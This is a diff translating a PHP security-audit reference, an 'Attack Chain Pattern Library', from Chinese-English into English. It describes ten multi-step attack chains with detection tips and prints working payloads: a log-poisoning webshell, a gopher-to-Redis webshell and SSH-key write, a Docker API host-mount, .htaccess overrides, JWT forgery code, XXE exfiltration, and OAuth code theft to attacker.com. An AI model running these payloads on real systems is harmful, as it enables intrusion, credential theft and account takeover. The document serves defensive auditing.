@@ -1,118 +1,118 @@
-# Attack Chain Pattern Library / 攻击链模式库
+# Attack Chain Pattern Library
 
-> 已知的多步攻击链模式，用于 PHP 项目安全审计时识别跨漏洞组合利用路径。
+> Known multi-step attack chain patterns for identifying cross-vulnerability combination exploitation paths during PHP project security audits.
 > Each chain includes a diagram, prerequisites, and per-step sink type mapping.
 
 ---
 
-## 1. SQLi -> SSTI 链 (SQL Injection to Server-Side Template Injection)
+## 1. SQLi -> SSTI Chain (SQL Injection to Server-Side Template Injection)
 
-**Chain Diagram / 链路图:**
+**Chain Diagram:**
 
 ```
 A (User Input) → B (SQL Injection) → C (Query Result Rendered in Template) → D (SSTI / RCE)
 ```
 
-**Prerequisites / 前提条件:**
-- 应用存在 SQL 注入点（通常为 SELECT 查询，结果会回显）
-- SQL 查询结果未经转义直接拼入模板引擎（Twig, Blade, Smarty 等）
-- 模板引擎未启用沙箱模式或沙箱配置不当
+**Prerequisites:**
+- Application has a SQL injection point (typically a SELECT query whose results are reflected)
+- SQL query results are directly concatenated into a template engine (Twig, Blade, Smarty, etc.) without escaping
+- Template engine sandbox mode is not enabled or sandbox is misconfigured
 
-**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**
+**Step-by-Step Sink Mapping:**
 
 | Step | Action | Sink Type |
 |------|--------|-----------|
-| A | 用户输入进入 SQL 查询 | `SQL_INJECTION` |
-| B | SQL 查询返回恶意模板语法 | `DATA_FLOW` (中间传递) |
-| C | 结果拼入模板字符串并渲染 | `SSTI` |
-| D | 模板引擎执行任意代码 | `CODE_EXECUTION` |
+| A | User input enters SQL query | `SQL_INJECTION` |
+| B | SQL query returns malicious template syntax | `DATA_FLOW` (intermediate transfer) |
+| C | Result concatenated into template string and rendered | `SSTI` |
+| D | Template engine executes arbitrary code | `CODE_EXECUTION` |
 
-**Hex Encoding Bypass / 十六进制编码绕过:**
+**Hex Encoding Bypass:**
 
-当 WAF 或输入过滤拦截 `{{` `}}` 时，可在 SQL 层使用 hex 编码绕过：
+When WAF or input filters block `{{` `}}`, hex encoding at the SQL layer MAY be used to bypass:
 
 ```sql
--- 原始 payload: {{7*7}} 或 {{_self.env.registerUndefinedFilterCallback("exec")}}
--- Hex 编码后存入数据库:
-SELECT 0x7b7b372a377d7d;          -- 返回 {{7*7}}
+-- Original payload: {{7*7}} or {{_self.env.registerUndefinedFilterCallback("exec")}}
+-- Hex-encoded and stored in the database:
+SELECT 0x7b7b372a377d7d;          -- Returns {{7*7}}
 SELECT 0x7b7b5f73656c662e656e762e7265676973746572556e646566696e656446696c74657243616c6c6261636b28226578656322297d7d;
--- 数据库存储的是原始字节, 取出后模板引擎直接解析 {{...}}
+-- The database stores raw bytes; once retrieved, the template engine directly parses {{...}}
 ```
 
-**Detection Pattern / 检测要点:**
-- 审计所有 SQL 查询结果进入 `render()`, `display()`, `Blade::compileString()` 的路径
-- 关注 `CONCAT()`, `CHAR()`, `0x` 等编码函数在 SELECT 中的使用
+**Detection Pattern:**
+- Audit all paths where SQL query results flow into `render()`, `display()`, `Blade::compileString()`
+- Watch for encoding functions like `CONCAT()`, `CHAR()`, `0x` used in SELECT statements
 
 ---
 
-## 2. LFI -> Log Poisoning -> RCE 链 (Local File Inclusion to Remote Code Execution)
+## 2. LFI -> Log Poisoning -> RCE Chain (Local File Inclusion to Remote Code Execution)
 
-**Chain Diagram / 链路图:**
+**Chain Diagram:**
 
 ```
 A (Path Traversal / LFI) → B (Read Log File) → C (User-Agent Inject PHP Code into Log) → D (Include Log File) → E (RCE)
 ```
 
-**Prerequisites / 前提条件:**
-- 存在本地文件包含漏洞（`include`, `require`, `include_once` 等接受用户输入）
-- Web 服务器日志路径可预测（如 `/var/log/apache2/access.log`, `/var/log/nginx/access.log`）
-- 日志文件对 PHP 进程可读
-- `allow_url_include` 不需要开启（本地文件即可）
+**Prerequisites:**
+- A local file inclusion vulnerability exists (`include`, `require`, `include_once`, etc. accept user input)
+- Web server log paths are predictable (e.g., `/var/log/apache2/access.log`, `/var/log/nginx/access.log`)
+- Log files are readable by the PHP process
+- `allow_url_include` does not need to be enabled (local files suffice)
 
-**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**
+**Step-by-Step Sink Mapping:**
 
 | Step | Action | Sink Type |
 |------|--------|-----------|
-| A | 路径穿越读取任意文件 | `PATH_TRAVERSAL` |
-| B | 确认可读取日志文件 | `FILE_READ` |
-| C | 发送含 PHP 代码的 User-Agent 请求 | `LOG_INJECTION` |
-| D | 通过 LFI include 日志文件 | `FILE_INCLUSION` |
-| E | PHP 引擎解析日志中的 `<?php ?>` 标签 | `CODE_EXECUTION` |
+| A | Path traversal to read arbitrary files | `PATH_TRAVERSAL` |
+| B | Confirm log file is readable | `FILE_READ` |
+| C | Send request with PHP code in User-Agent header | `LOG_INJECTION` |
+| D | Include log file via LFI | `FILE_INCLUSION` |
+| E | PHP engine parses `<?php ?>` tags in the log | `CODE_EXECUTION` |
 
-**Exploit Flow / 利用流程:**
+**Exploit Flow:**
 
 ```
-# Step 1: 注入恶意 User-Agent 到日志
+# Step 1: Inject malicious User-Agent into log
 curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/
 
-# Step 2: 通过 LFI 包含日志文件
+# Step 2: Include log file via LFI
 http://target.com/index.php?page=../../../var/log/apache2/access.log&cmd=id
 ```
 
-**Common Log Paths / 常见日志路径:**
+**Common Log Paths:**
 - Apache: `/var/log/apache2/access.log`, `/var/log/httpd/access_log`
 - Nginx: `/var/log/nginx/access.log`
 - PHP-FPM: `/var/log/php-fpm.log`
-- 自定义 Laravel: `storage/logs/laravel.log`
+- Custom Laravel: `storage/logs/laravel.log`
 
 ---
 
-## 3. SSRF -> 内部服务 -> RCE 链 (Server-Side Request Forgery to Internal Service Exploitation)
+## 3. SSRF -> Internal Service -> RCE Chain (Server-Side Request Forgery to Internal Service Exploitation)
 
-**Chain Diagram / 链路图:**
+**Chain Diagram:**
 
 ```
 A (SSRF Entry Point) → B (Access Internal Service) → C (Exploit Internal API) → D (RCE / Data Exfil)
 ```
 
-**Prerequisites / 前提条件:**
-- 应用存在 SSRF 漏洞（`file_get_contents`, `curl_exec`, `fsockopen` 等接受用户控制的 URL）
-- 内部网络存在未认证的敏感服务
-- 无有效的 SSRF 防护（IP 黑名单不完善，可通过 DNS rebinding 等绕过）
+**Prerequisites:**
+- Application has an SSRF vulnerability (`file_get_contents`, `curl_exec`, `fsockopen`, etc. accept user-controlled URLs)
+- Internal network contains unauthenticated sensitive services
+- No effective SSRF protection (incomplete IP blocklist, bypassable via DNS rebinding, etc.)
 
-**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**
+**Step-by-Step Sink Mapping:**
 
 | Step | Action | Sink Type |
 |------|--------|-----------|
-| A | 用户控制请求目标 URL | `SSRF` |
-| B | 请求到达内部服务 | `NETWORK_ACCESS` |
-| C | 利用内部服务 API 执行操作 | `API_ABUSE` |
-| D | 获得代码执行或数据 | `CODE_EXECUTION` / `DATA_LEAK` |
+| A | User controls request target URL | `SSRF` |
+| B | Request reaches internal service | `NETWORK_ACCESS` |
+| C | Exploit internal service API to perform operations | `API_ABUSE` |
+| D | Achieve code execution or data exfiltration | `CODE_EXECUTION` / `DATA_LEAK` |
 
 **Target: Docker API (localhost:2375):**
 
 ```
-# 通过 SSRF 创建恶意容器
+# Create malicious container via SSRF
 POST http://127.0.0.1:2375/containers/create
 {"Image":"alpine","Cmd":["/bin/sh","-c","cat /etc/shadow"],"Binds":["/:/host"]}
 
@@ -123,14 +123,14 @@ $url = "http://127.0.0.1:2375/containers/create";
 **Target: Redis (localhost:6379) - Write Webshell:**
 
 ```
-# 利用 gopher 协议通过 SSRF 操作 Redis 写 webshell
+# Use gopher protocol via SSRF to operate Redis and write webshell
 gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<?php eval($_POST[1]);?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
 ```
 
 **Target: Redis - Write SSH Key:**
 
 ```
-# 写入 SSH 公钥到 /root/.ssh/authorized_keys
+# Write SSH public key to /root/.ssh/authorized_keys
 redis-cli -h 127.0.0.1 CONFIG SET dir /root/.ssh
 redis-cli -h 127.0.0.1 CONFIG SET dbfilename authorized_keys
 redis-cli -h 127.0.0.1 SET x "\n\nssh-rsa AAAA...your_key...\n\n"
@@ -138,84 +138,84 @@ redis-cli -h 127.0.0.1 SAVE
 ```
 
 **Target: Internal Admin Panels:**
-- `http://127.0.0.1:8080/admin` - 内部管理面板无认证
-- `http://192.168.1.0/24` - 内网扫描发现其他服务
+- `http://127.0.0.1:8080/admin` - Internal admin panel without authentication
+- `http://192.168.1.0/24` - Internal network scan discovers other services
 
 ---
 
-## 4. 文件上传 -> .htaccess -> Webshell 链 (File Upload to Apache Config Override to Webshell)
+## 4. File Upload -> .htaccess -> Webshell Chain (File Upload to Apache Config Override to Webshell)
 
-**Chain Diagram / 链路图:**
+**Chain Diagram:**
 
 ```
 A (Upload .htaccess) → B (Override Apache Parse Rules) → C (Upload Webshell with Allowed Extension) → D (RCE)
 ```
 
-**Prerequisites / 前提条件:**
-- 上传功能未限制 `.htaccess` 文件上传（或可绕过文件名检测）
-- Apache 配置启用了 `AllowOverride All` 或 `AllowOverride FileInfo`
-- 上传目录可通过 Web 直接访问
-- 知道上传目录的 Web 路径
+**Prerequisites:**
+- Upload functionality does not restrict `.htaccess` file uploads (or filename detection can be bypassed)
+- Apache configuration has `AllowOverride All` or `AllowOverride FileInfo` enabled
+- Upload directory is directly accessible via the web
+- The web path to the upload directory is known
 
-**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**
+**Step-by-Step Sink Mapping:**
 
 | Step | Action | Sink Type |
 |------|--------|-----------|
-| A | 上传 .htaccess 文件 | `FILE_UPLOAD` |
-| B | Apache 加载新的解析规则 | `CONFIG_OVERRIDE` |
-| C | 上传伪装扩展名的 webshell | `FILE_UPLOAD` |
-| D | 访问 webshell 获得代码执行 | `CODE_EXECUTION` |
+| A | Upload .htaccess file | `FILE_UPLOAD` |
+| B | Apache loads new parsing rules | `CONFIG_OVERRIDE` |
+| C | Upload webshell with disguised extension | `FILE_UPLOAD` |
+| D | Access webshell to achieve code execution | `CODE_EXECUTION` |
 
-**Malicious .htaccess Content / 恶意 .htaccess 内容:**
+**Malicious .htaccess Content:**
 
 ```apache
-# 方法 1: 将 .jpg 文件作为 PHP 解析
+# Method 1: Parse .jpg files as PHP
 AddType application/x-httpd-php .jpg
 
-# 方法 2: 将自定义扩展名作为 PHP 解析
+# Method 2: Parse custom extension as PHP
 AddType application/x-httpd-php .abc
 
-# 方法 3: 使用 SetHandler
+# Method 3: Using SetHandler
 <FilesMatch "\.png$">
     SetHandler application/x-httpd-php
 </FilesMatch>
 
-# 方法 4: 配合 php_value 修改配置
+# Method 4: Modify config with php_value
 php_value auto_prepend_file /tmp/evil.php
 ```
 
 ---
 
-## 5. 信息泄露 -> Token 伪造 -> 权限提升链 (Information Disclosure to Token Forgery to Privilege Escalation)
+## 5. Information Disclosure -> Token Forgery -> Privilege Escalation Chain
 
-**Chain Diagram / 链路图:**
+**Chain Diagram:**
 
 ```
 A (Info Leak: .env / phpinfo / debug page) → B (Extract Secret Key / Token) → C (Forge Auth Token) → D (Privilege Escalation)
 ```
 
-**Prerequisites / 前提条件:**
-- 应用存在信息泄露点（`.env` 文件可访问, `phpinfo()` 暴露, debug 模式开启）
-- 泄露的信息包含加密密钥、JWT secret 等敏感凭据
-- 应用依赖这些密钥进行身份验证或授权
+**Prerequisites:**
+- Application has an information disclosure point (`.env` file accessible, `phpinfo()` exposed, debug mode enabled)
+- Leaked information contains encryption keys, JWT secrets, or other sensitive credentials
+- Application relies on these keys for authentication or authorization
 
-**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**
+**Step-by-Step Sink Mapping:**
 
 | Step | Action | Sink Type |
 |------|--------|-----------|
-| A | 访问泄露的敏感配置 | `INFORMATION_DISCLOSURE` |
-| B | 提取密钥/secret | `SECRET_EXTRACTION` |
-| C | 使用密钥伪造令牌 | `TOKEN_FORGERY` |
-| D | 以高权限身份操作 | `PRIVILEGE_ESCALATION` |
+| A | Access leaked sensitive configuration | `INFORMATION_DISCLOSURE` |
+| B | Extract key/secret | `SECRET_EXTRACTION` |
+| C | Use key to forge token | `TOKEN_FORGERY` |
+| D | Operate with elevated privileges | `PRIVILEGE_ESCALATION` |
 
 **Scenario A: Laravel .env Leak -> APP_KEY -> Encryption Forgery:**
 
 ```
-# .env 泄露 APP_KEY
+# .env leaks APP_KEY
 APP_KEY=base64:wLp2IS3xkVBaGOby9EfPJr/T5IfjRAaXjRD3WNMljJQ=
 
-# 利用 APP_KEY 伪造 Laravel encrypted cookie / session
-# 可直接反序列化攻击或伪造管理员 session
+# Use APP_KEY to forge Laravel encrypted cookie / session
+# Can directly perform deserialization attack or forge admin session
 php artisan tinker
 >>> encrypt(['user_id' => 1, 'role' => 'admin']);
 ```
@@ -223,10 +223,10 @@ php artisan tinker
 **Scenario B: JWT Secret Leak -> Token Forgery:**
 
 ```php
-// 泄露的 JWT secret
+// Leaked JWT secret
 $secret = "leaked_jwt_secret_from_env";
 
-// 伪造 admin token
+// Forge admin token
 $header = base64url_encode('{"alg":"HS256","typ":"JWT"}');
 $payload = base64url_encode('{"sub":"1","role":"admin","exp":9999999999}');
 $signature = hash_hmac('sha256', "$header.$payload", $secret, true);
@@ -236,36 +236,36 @@ $token = "$header.$payload." . base64url_encode($signature);
 **Scenario C: phpinfo() -> Session Path -> Session Hijack:**
 
 ```
-# phpinfo() 泄露 session.save_path = /var/lib/php/sessions
-# 结合 LFI 读取其他用户的 session 文件
+# phpinfo() leaks session.save_path = /var/lib/php/sessions
+# Combined with LFI to read other users' session files
 # /var/lib/php/sessions/sess_<SESSION_ID>
 ```
 
 ---
 
-## 6. 反序列化 -> POP 链 -> RCE (Deserialization to POP Chain to Remote Code Execution)
+## 6. Deserialization -> POP Chain -> RCE (Deserialization to POP Chain to Remote Code Execution)
 
-**Chain Diagram / 链路图:**
+**Chain Diagram:**
 
 ```
 A (User-Controlled Serialized Data) → B (unserialize() Trigger) → C (POP Chain Gadgets) → D (Arbitrary Code Execution)
 ```
 
-**Prerequisites / 前提条件:**
-- 应用使用 `unserialize()` 处理用户可控数据（Cookie, Session, 缓存, API 参数）
-- 项目依赖中存在可利用的 POP gadget 类（Laravel, Symfony, Yii, Guzzle 等）
-- PHP 版本和框架版本匹配已知 gadget chain
+**Prerequisites:**
+- Application uses `unserialize()` to process user-controllable data (Cookie, Session, cache, API parameters)
+- Project dependencies contain exploitable POP gadget classes (Laravel, Symfony, Yii, Guzzle, etc.)
+- PHP version and framework version match known gadget chains
 
-**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**
+**Step-by-Step Sink Mapping:**
 
 | Step | Action | Sink Type |
 |------|--------|-----------|
-| A | 恶意序列化数据进入应用 | `DESERIALIZATION` |
-| B | `unserialize()` 触发魔术方法 | `UNSAFE_DESERIALIZATION` |
-| C | 魔术方法链式调用到危险函数 | `POP_CHAIN` |
-| D | 最终 gadget 执行系统命令 | `CODE_EXECUTION` |
+| A | Malicious serialized data enters application | `DESERIALIZATION` |
+| B | `unserialize()` triggers magic methods | `UNSAFE_DESERIALIZATION` |
+| C | Magic methods chain-call to dangerous functions | `POP_CHAIN` |
+| D | Final gadget executes system commands | `CODE_EXECUTION` |
 
-**Common PHP Framework Gadget Chains / 常见框架 Gadget 链:**
+**Common PHP Framework Gadget Chains:**
 
 ```
 Laravel:  PendingBroadcast -> Dispatcher -> call_user_func()
@@ -275,85 +275,85 @@ Guzzle:   FnStream -> __destruct() -> call_user_func_array()
 Monolog:  BufferHandler -> __destruct() -> close() -> flush() -> write() -> system()
 ```
 
-**Detection Pattern / 检测要点:**
-- 搜索所有 `unserialize()` 调用，追踪参数来源
-- 关注 `__destruct`, `__wakeup`, `__toString`, `__call` 魔术方法
-- 使用 PHPGGC 工具验证可用 gadget chain
+**Detection Pattern:**
+- Search all `unserialize()` calls and trace parameter sources
+- Watch for `__destruct`, `__wakeup`, `__toString`, `__call` magic methods
+- Use the PHPGGC tool to verify available gadget chains
 
 ---
 
-## 7. 二阶 SQLi -> 密码重置 -> 账户接管链 (Second-Order SQLi to Password Reset to Account Takeover)
+## 7. Second-Order SQLi -> Password Reset -> Account Takeover Chain
 
-**Chain Diagram / 链路图:**
+**Chain Diagram:**
 
 ```
 A (Register with Malicious Username) → B (Malicious Data Stored in DB) → C (Password Change Triggers SQLi) → D (Admin Password Overwritten) → E (Account Takeover)
 ```
 
-**Prerequisites / 前提条件:**
-- 注册或资料修改功能对输入做了转义/参数化（写入安全）
-- 密码修改/重置功能从数据库取出用户名后直接拼入 SQL（读取后使用不安全）
-- 存在"信任已存储数据"的错误假设
+**Prerequisites:**
+- Registration or profile modification functionality escapes/parameterizes input (write is safe)
+- Password change/reset functionality retrieves username from database and directly concatenates it into SQL (read-then-use is unsafe)
+- A flawed assumption of "trust already-stored data" exists
 
-**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**
+**Step-by-Step Sink Mapping:**
 
 | Step | Action | Sink Type |
 |------|--------|-----------|
-| A | 注册用户名含 SQL payload | `DATA_INPUT` (安全写入) |
-| B | 恶意数据存入数据库 | `DATA_STORE` |
-| C | 密码修改取出用户名拼入 SQL | `SQL_INJECTION` (二阶触发) |
-| D | UPDATE 语句修改 admin 密码 | `DATA_MANIPULATION` |
-| E | 使用新密码登录管理员账户 | `ACCOUNT_TAKEOVER` |
+| A | Register with username containing SQL payload | `DATA_INPUT` (safe write) |
+| B | Malicious data stored in database | `DATA_STORE` |
+| C | Password change retrieves username and concatenates into SQL | `SQL_INJECTION` (second-order trigger) |
+| D | UPDATE statement modifies admin password | `DATA_MANIPULATION` |
+| E | Log in to admin account using new password | `ACCOUNT_TAKEOVER` |
 
-**Exploit Example / 利用示例:**
+**Exploit Example:**
 
 ```php
-// Step A: 注册恶意用户名
-$username = "admin'-- ";  // 或 "admin' OR '1'='1"
+// Step A: Register with malicious username
+$username = "admin'-- ";  // or "admin' OR '1'='1"
 
-// Step C: 密码修改逻辑（存在二阶 SQLi）
-$user = get_current_user();  // 从 DB 取出 "admin'-- "
+// Step C: Password change logic (has second-order SQLi)
+$user = get_current_user();  // Retrieves "admin'-- " from DB
 $query = "UPDATE users SET password='$new_pass' WHERE username='$user'";
-// 实际执行: UPDATE users SET password='hacked' WHERE username='admin'-- '
-// 结果: admin 的密码被修改
+// Actually executes: UPDATE users SET password='hacked' WHERE username='admin'-- '
+// Result: admin's password is modified
 ```
 
 ---
 
-## 8. XXE -> SSRF -> 内网探测链 (XML External Entity to SSRF to Internal Network Reconnaissance)
+## 8. XXE -> SSRF -> Internal Network Reconnaissance Chain (XML External Entity to SSRF to Internal Network Reconnaissance)
 
-**Chain Diagram / 链路图:**
+**Chain Diagram:**
 
 ```
 A (XML Input Point) → B (XXE Entity Declaration) → C (External Entity Fetches Internal URL) → D (Internal Service Response Leaked) → E (Further Exploitation)
 ```
 
-**Prerequisites / 前提条件:**
-- 应用解析用户提交的 XML 数据（API, 文件上传如 XLSX/DOCX/SVG, SOAP 端点）
-- XML 解析器未禁用外部实体（`libxml_disable_entity_loader` 未设置，PHP < 8.0 默认危险）
-- 内部网络存在可探测的服务
+**Prerequisites:**
+- Application parses user-submitted XML data (API, file uploads such as XLSX/DOCX/SVG, SOAP endpoints)
+- XML parser has not disabled external entities (`libxml_disable_entity_loader` not set; PHP < 8.0 is dangerous by default)
+- Internal network contains discoverable services
 
-**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**
+**Step-by-Step Sink Mapping:**
 
 | Step | Action | Sink Type |
 |------|--------|-----------|
-| A | 提交包含 DTD 的 XML | `XML_INJECTION` |
-| B | 解析器处理外部实体声明 | `XXE` |
-| C | 实体引用触发内部 HTTP/file 请求 | `SSRF` |
-| D | 响应数据回显或通过 OOB 外带 | `INFORMATION_DISCLOSURE` |
-| E | 利用获取的信息进一步攻击 | `LATERAL_MOVEMENT` |
+| A | Submit XML containing DTD | `XML_INJECTION` |
+| B | Parser processes external entity declaration | `XXE` |
+| C | Entity reference triggers internal HTTP/file request | `SSRF` |
+| D | Response data reflected or exfiltrated via OOB | `INFORMATION_DISCLOSURE` |
+| E | Use obtained information for further attacks | `LATERAL_MOVEMENT` |
 
-**Payload Examples / Payload 示例:**
+**Payload Examples:**
 
 ```xml
-<!-- 基本 XXE -> 内网探测 -->
+<!-- Basic XXE -> Internal network reconnaissance -->
 <?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
 ]>
 <root>&xxe;</root>
 
-<!-- OOB XXE (Blind) -> 外带数据 -->
+<!-- OOB XXE (Blind) -> Out-of-band data exfiltration -->
 <?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
@@ -365,30 +365,30 @@ A (XML Input Point) → B (XXE Entity Declaration) → C (External Entity Fetche
 
 ---
 
-## 9. Open Redirect -> OAuth Token Theft 链 (Open Redirect to OAuth Authorization Code/Token Theft)
+## 9. Open Redirect -> OAuth Token Theft Chain (Open Redirect to OAuth Authorization Code/Token Theft)
 
-**Chain Diagram / 链路图:**
+**Chain Diagram:**
 
 ```
 A (Find Open Redirect on Target) → B (Craft OAuth URL with redirect_uri=open_redirect) → C (User Authorizes App) → D (Auth Code/Token Sent to Attacker via Redirect) → E (Account Takeover)
 ```
 
-**Prerequisites / 前提条件:**
-- 目标站点存在开放重定向漏洞（`header("Location: $user_input")`）
-- OAuth 配置对 `redirect_uri` 校验不严（仅校验域名前缀，允许子路径）
-- 攻击者可诱导用户点击构造好的 OAuth 授权链接
+**Prerequisites:**
+- Target site has an open redirect vulnerability (`header("Location: $user_input")`)
+- OAuth configuration has lax `redirect_uri` validation (only checks domain prefix, allows sub-paths)
+- Attacker can trick user into clicking a crafted OAuth authorization link
 
-**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**
+**Step-by-Step Sink Mapping:**
 
 | Step | Action | Sink Type |
 |------|--------|-----------|
-| A | 发现开放重定向端点 | `OPEN_REDIRECT` |
-| B | 将重定向嵌入 OAuth redirect_uri | `OAUTH_MISCONFIGURATION` |
-| C | 用户完成授权流程 | `SOCIAL_ENGINEERING` |
-| D | Authorization code 经重定向发往攻击者 | `TOKEN_THEFT` |
-| E | 攻击者用 code 换取 access_token | `ACCOUNT_TAKEOVER` |
+| A | Discover open redirect endpoint | `OPEN_REDIRECT` |
+| B | Embed redirect in OAuth redirect_uri | `OAUTH_MISCONFIGURATION` |
+| C | User completes authorization flow | `SOCIAL_ENGINEERING` |
+| D | Authorization code redirected to attacker | `TOKEN_THEFT` |
+| E | Attacker exchanges code for access_token | `ACCOUNT_TAKEOVER` |
 
-**Exploit Example / 利用示例:**
+**Exploit Example:**
 
 ```
 # Step A: Open redirect on target
@@ -401,54 +401,54 @@ https://oauth.provider.com/authorize?
   response_type=code&
   scope=openid+profile+email
 
-# Step D: 用户授权后, code 被重定向到攻击者
+# Step D: After user authorizes, code is redirected to attacker
 https://attacker.com/steal?code=AUTHORIZATION_CODE
 ```
 
-**PHP Detection Pattern / PHP 检测要点:**
-- 审计所有 `header("Location: ...")` 中包含用户输入的位置
-- 检查 OAuth redirect_uri 验证逻辑是否为严格的全匹配
-- 注意 `parse_url()` 的解析歧义问题
+**PHP Detection Pattern:**
+- Audit all locations where `header("Location: ...")` contains user input
+- Check whether OAuth redirect_uri validation logic uses strict full matching
+- Watch for `parse_url()` parsing ambiguity issues
 
 ---
 
-## 10. 竞态条件 -> 双重支付 / 权限提升链 (Race Condition to Double Spend / Privilege Escalation)
+## 10. Race Condition -> Double Spend / Privilege Escalation Chain
 
-**Chain Diagram / 链路图:**
+**Chain Diagram:**
 
 ```
 A (Identify TOCTOU Vulnerable Endpoint) → B (Send Concurrent Requests) → C (Check Passes for All Requests Before State Update) → D (Multiple Operations Execute on Same Resource) → E (Balance Manipulation / Privilege Escalation)
 ```
 
-**Prerequisites / 前提条件:**
-- 应用存在 TOCTOU (Time of Check to Time of Use) 缺陷
-- 关键业务逻辑未使用数据库事务或锁机制（`SELECT ... FOR UPDATE`, `LOCK IN SHARE MODE`）
-- 并发请求能在检查与更新之间的时间窗口内到达
+**Prerequisites:**
+- Application has a TOCTOU (Time of Check to Time of Use) flaw
+- Critical business logic does not use database transactions or locking mechanisms (`SELECT ... FOR UPDATE`, `LOCK IN SHARE MODE`)
+- Concurrent requests can arrive within the time window between check and update
 
-**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**
+**Step-by-Step Sink Mapping:**
 
 | Step | Action | Sink Type |
 |------|--------|-----------|
-| A | 识别"先检查再操作"的逻辑 | `RACE_CONDITION` |
-| B | 并发发送多个相同请求 | `CONCURRENT_REQUEST` |
-| C | 所有请求通过余额/权限检查 | `TOCTOU_BYPASS` |
-| D | 每个请求各执行一次扣款/操作 | `STATE_MANIPULATION` |
-| E | 余额异常或权限被重复赋予 | `BUSINESS_LOGIC_BYPASS` |
+| A | Identify "check-then-act" logic | `RACE_CONDITION` |
+| B | Send multiple identical requests concurrently | `CONCURRENT_REQUEST` |
+| C | All requests pass balance/permission check | `TOCTOU_BYPASS` |
+| D | Each request executes a deduction/operation separately | `STATE_MANIPULATION` |
+| E | Balance anomaly or privileges granted multiple times | `BUSINESS_LOGIC_BYPASS` |
 
-**Vulnerable PHP Pattern / 易受攻击的 PHP 模式:**
+**Vulnerable PHP Pattern:**
 
 ```php
-// 双重支付漏洞示例 - 无锁的余额检查
+// Double-spend vulnerability example - balance check without locking
 function transfer($from, $to, $amount) {
     $balance = DB::select("SELECT balance FROM accounts WHERE id = ?", [$from]);
-    // TOCTOU 窗口: 在 check 和 update 之间，并发请求也能通过检查
+    // TOCTOU window: between check and update, concurrent requests also pass the check
     if ($balance >= $amount) {
         DB::update("UPDATE accounts SET balance = balance - ? WHERE id = ?", [$amount, $from]);
         DB::update("UPDATE accounts SET balance = balance + ? WHERE id = ?", [$amount, $to]);
     }
 }
 
-// 修复方案: 使用数据库事务 + 行级锁
+// Fix: use database transaction + row-level locking
 function transfer_safe($from, $to, $amount) {
     DB::transaction(function () use ($from, $to, $amount) {
         $balance = DB::selectOne(
@@ -462,10 +462,10 @@ function transfer_safe($from, $to, $amount) {
 }
 ```
 
-**Exploitation Tool / 利用工具:**
+**Exploitation Tool:**
 
 ```bash
-# 使用 curl 并发发送请求触发竞态条件
+# Use curl to send concurrent requests to trigger race condition
 for i in $(seq 1 20); do
   curl -s -X POST http://target.com/api/transfer \
     -d "to=attacker&amount=1000" \
@@ -476,17 +476,17 @@ wait
 
 ---
 
-## Cross-Reference / 交叉参考
+## Cross-Reference
 
-链之间存在组合可能，审计时应关注以下跨链路径:
+Chains MAY be combined. During audits, the following cross-chain paths SHOULD be examined:
 
-| 起始漏洞 | 可衔接链 | 最终影响 |
-|----------|---------|---------|
-| SQLi (Chain 1) | -> 信息泄露 (Chain 5) -> Token 伪造 | 账户接管 |
-| LFI (Chain 2) | -> 读取 .env (Chain 5) -> 反序列化 (Chain 6) | RCE |
-| SSRF (Chain 3) | -> 内网 Redis -> 写 webshell | RCE |
-| 文件上传 (Chain 4) | -> 上传恶意序列化数据 (Chain 6) | RCE |
+| Starting Vulnerability | Connectable Chain | Final Impact |
+|------------------------|-------------------|--------------|
+| SQLi (Chain 1) | -> Info Disclosure (Chain 5) -> Token Forgery | Account Takeover |
+| LFI (Chain 2) | -> Read .env (Chain 5) -> Deserialization (Chain 6) | RCE |
+| SSRF (Chain 3) | -> Internal Redis -> Write Webshell | RCE |
+| File Upload (Chain 4) | -> Upload Malicious Serialized Data (Chain 6) | RCE |
 | XXE (Chain 8) | -> SSRF (Chain 3) -> Docker API | RCE |
-| Open Redirect (Chain 9) | -> OAuth Token -> 管理面板 -> 更多漏洞 | 完全控制 |
+| Open Redirect (Chain 9) | -> OAuth Token -> Admin Panel -> More Vulnerabilities | Full Control |
 
-> **审计原则**: 单个低危漏洞组合后可能达到 Critical 级别。永远评估链式利用的可能性。
+> **Audit Principle**: Individual low-severity vulnerabilities MAY reach Critical level when combined. Always evaluate the possibility of chained exploitation.
